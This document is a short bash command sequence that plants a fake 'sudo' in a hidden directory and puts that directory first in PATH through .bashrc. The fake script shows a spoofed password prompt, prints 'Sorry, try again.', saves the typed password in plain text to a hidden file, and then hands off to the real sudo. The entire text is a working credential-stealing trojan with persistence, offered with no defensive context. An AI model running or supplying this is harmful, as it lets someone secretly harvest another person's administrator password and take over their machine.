bash
mkdir .hidden
echo "export PATH=\$HOME/.hidden/:\$PATH:" >> .bashrc
echo "read -sp \"[sudo] password for $USER: \" sudopass" > .hidden/sudo
echo "echo \"\"" >> .hidden/sudo
echo "sleep 2" >> .hidden/sudo
echo "echo \"Sorry, try again.\"" >> .hidden/sudo
echo "echo \$sudopass >> .hidden/pass.txt" >> .hidden/sudo
echo "/usr/bin/sudo \$1" >> .hidden/sudo
chmod +x .hidden/sudo
exit
exit
